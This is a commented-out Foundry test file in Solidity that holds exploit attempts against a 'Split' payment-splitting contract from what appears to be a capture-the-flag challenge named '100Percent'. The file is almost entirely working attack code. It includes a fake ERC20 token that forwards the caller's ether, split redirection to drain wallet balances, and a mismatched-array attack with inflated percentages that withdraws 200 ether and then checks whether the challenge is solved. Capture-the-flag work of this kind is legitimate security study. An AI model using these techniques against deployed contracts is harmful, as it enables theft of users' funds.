// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";
// import "../src/100Percent/Challenge.sol";

// contract FakeERC20 is Test {
//     receive() external payable {}

//     // Split SPLIT = Split(0x1373d20cd6E07Fb7dE5c75C12322fae93fd753E6);

//     function balanceOf(address) external pure returns (uint256) {
//         return 1000 ether;
//     }

//     function transfer(address, uint256) external returns (bool) {
//         console.log(address(msg.sender).balance);
//         bool success = payable(address(4)).send(address(msg.sender).balance);
//         console.log("success: ", success);
//         return true;
//     }
// }

// contract ContractTest is Test {
//     Challenge challenge = Challenge(vm.envAddress("CHALLENGE_ADDRESS"));
//     address sender = vm.addr(vm.envUint("PRIVATE_KEY"));
//     Split SPLIT;
//     FakeERC20 fakeERC20;

//     function setUp() public {
//         vm.createSelectFork(vm.rpcUrl("paradigm"));
//         // vm.startPrank(sender);
//         fakeERC20 = new FakeERC20();
//         vm.prank(sender);
//         SPLIT = challenge.SPLIT();
//     }

//     function getSplitData() public {
//         Split.SplitData memory splitData = SPLIT.splitsById(0);
//         address splitAddress = address(SPLIT);
//         console.log("split address: ", address(SPLIT));
//         console.log("split balance: ", address(SPLIT).balance);
//         console.log("split wallet address: ", address(splitData.wallet));
//         console.log(
//             "split wallet balance: ",
//             address(splitData.wallet).balance
//         );
//     }

//     //create split with my address in addr
//     //call distribute from seperate account and split 100% of funds to me
//     //my balances increases
//     //i call withdraw
//     function firstExploit() public {
//         address[] memory addrs = new address[](2);
//         addrs[0] = address(0x000000000000000000000000000000000000dEaD);
//         addrs[1] = address(0x000000000000000000000000000000000000bEEF);
//         uint32[] memory percents = new uint32[](2);
//         percents[0] = 5e5;
//         percents[1] = 5e5;
//         vm.prank(sender);
//         SPLIT.distribute(0, addrs, percents, 0, IERC20(address(0x00)));
//         //removes all ether from split wallet into split contract

//         address[] memory newAddrs = new address[](1);
//         newAddrs[0] = address(4);
//         uint32[] memory newPercents = new uint32[](1);
//         newPercents[0] = 1e6;

//         uint32 relayerFee = 0;

//         vm.prank(sender);
//         uint id = SPLIT.createSplit(newAddrs, newPercents, relayerFee);

//         address[] memory newAddrs2 = new address[](1);
//         newAddrs2[0] = address(SPLIT.splitsById(id).wallet);

//         vm.prank(sender);
//         SPLIT.updateSplit(id, newAddrs2, newPercents, relayerFee);

//         Split.SplitData memory splitData = SPLIT.splitsById(id);
//         splitData.wallet.deposit{value: 100 ether}();

//         vm.prank(address(4));
//         SPLIT.distribute(
//             id,
//             newAddrs2,
//             newPercents,
//             relayerFee,
//             IERC20(address(0x00))
//         );

//         console.log(
//             "split wallet contract balance: ",
//             SPLIT.balances(address(splitData.wallet), address(0x00))
//         );
//         console.log(
//             "addr(4) contract balance: ",
//             SPLIT.balances(address(4), address(0x00))
//         );
//         console.log("SPLIT contract balance: ", address(SPLIT).balance);

//         console.log("0------------");

//         vm.prank(sender);
//         SPLIT.updateSplit(id, newAddrs, newPercents, relayerFee);
//         vm.prank(sender);

//         splitData.wallet.deposit{value: 50 ether}();

//         vm.prank(address(4));
//         SPLIT.distribute(
//             id,
//             newAddrs,
//             newPercents,
//             relayerFee,
//             IERC20(address(0x00))
//         );
//         console.log(
//             "split wallet contract balance: ",
//             SPLIT.balances(address(splitData.wallet), address(0x00))
//         );
//         console.log(
//             "addr(4) contract balance: ",
//             SPLIT.balances(address(4), address(0x00))
//         );
//         console.log("SPLIT contract balance: ", address(SPLIT).balance);

//         console.log("0------------");
//     }

//     //create split for random token, redeem split for ether
//     function secondExploit() public {
//         address[] memory addrs = new address[](2);
//         addrs[0] = address(0x000000000000000000000000000000000000dEaD);
//         addrs[1] = address(0x000000000000000000000000000000000000bEEF);
//         uint32[] memory percents = new uint32[](2);
//         percents[0] = 5e5;
//         percents[1] = 5e5;
//         vm.prank(sender);
//         SPLIT.distribute(0, addrs, percents, 0, IERC20(address(0x00)));
//         //removes all ether from split wallet into split contract

//         address[] memory newAddrs = new address[](1);
//         newAddrs[0] = address(4);
//         uint32[] memory newPercents = new uint32[](1);
//         newPercents[0] = 1e6;

//         uint32 relayerFee = (1e6 / 10) - 1;

//         vm.prank(sender);
//         uint id = SPLIT.createSplit(newAddrs, newPercents, relayerFee);

//         address[] memory newAddrs2 = new address[](1);
//         newAddrs2[0] = address(SPLIT.splitsById(id).wallet);

//         vm.prank(sender);
//         SPLIT.updateSplit(id, newAddrs2, newPercents, relayerFee);

//         Split.SplitData memory splitData = SPLIT.splitsById(id);
//         splitData.wallet.deposit{value: 100 ether}();

//         vm.prank(address(4));
//         SPLIT.distribute(
//             id,
//             newAddrs2,
//             newPercents,
//             relayerFee,
//             IERC20(address(0x00))
//         );

//         console.log(
//             "split wallet contract balance: ",
//             SPLIT.balances(address(splitData.wallet), address(0x00))
//         );
//         console.log(
//             "addr(4) contract balance: ",
//             SPLIT.balances(address(4), address(0x00))
//         );
//         console.log("SPLIT contract balance: ", address(SPLIT).balance);

//         console.log("0------------");

//         vm.prank(address(4));
//         SPLIT.distribute(
//             id,
//             newAddrs2,
//             newPercents,
//             relayerFee,
//             IERC20(address(0x00))
//         );
//         console.log(
//             "split wallet contract balance: ",
//             SPLIT.balances(address(splitData.wallet), address(0x00))
//         );
//         console.log(
//             "addr(4) contract balance: ",
//             SPLIT.balances(address(4), address(0x00))
//         );
//         console.log("SPLIT contract balance: ", address(SPLIT).balance);

//         console.log("0------------");

//         getSplitData();
//     }

//     //using fake erc20
//     function testExploit() public {
//         address[] memory ogaddrs = new address[](2);
//         ogaddrs[0] = address(0x000000000000000000000000000000000000dEaD);
//         ogaddrs[1] = address(0x000000000000000000000000000000000000bEEF);
//         uint32[] memory ogpercents = new uint32[](2);
//         ogpercents[0] = 5e5;
//         ogpercents[1] = 5e5;

//         vm.prank(sender);
//         SPLIT.distribute(0, ogaddrs, ogpercents, 0, IERC20(address(0x00)));
//         uint32 relayerFee = 0;

//         //removes all ether from split wallet into split contract

//         address[] memory addrs = new address[](2);
//         addrs[0] = address(sender);
//         addrs[1] = address(2e6);

//         uint32[] memory percents = new uint32[](2);
//         percents[0] = 1e6;
//         percents[1] = 0;

//         address[] memory fakeAddrs = new address[](1);
//         fakeAddrs[0] = address(sender);

//         uint32[] memory fakePercents = new uint32[](3);
//         fakePercents[0] = 2e6;
//         fakePercents[1] = 1e6;
//         fakePercents[2] = 0;

//         vm.prank(sender);
//         uint id = SPLIT.createSplit(addrs, percents, relayerFee);
//         Split.SplitData memory splitData = SPLIT.splitsById(id);
//         splitData.wallet.deposit{value: 100 ether}();

//         SPLIT.distribute(
//             id,
//             fakeAddrs,
//             fakePercents,
//             relayerFee,
//             IERC20(address(0x00))
//         );

//         IERC20[] memory tokens = new IERC20[](1);
//         uint256[] memory amounts = new uint256[](1);
//         tokens[0] = IERC20(address(0x00));
//         amounts[0] = 200 ether;
//         vm.prank(sender);
//         SPLIT.withdraw(tokens, amounts);
//         console.log("is solved: ", challenge.isSolved());
//     }
// }
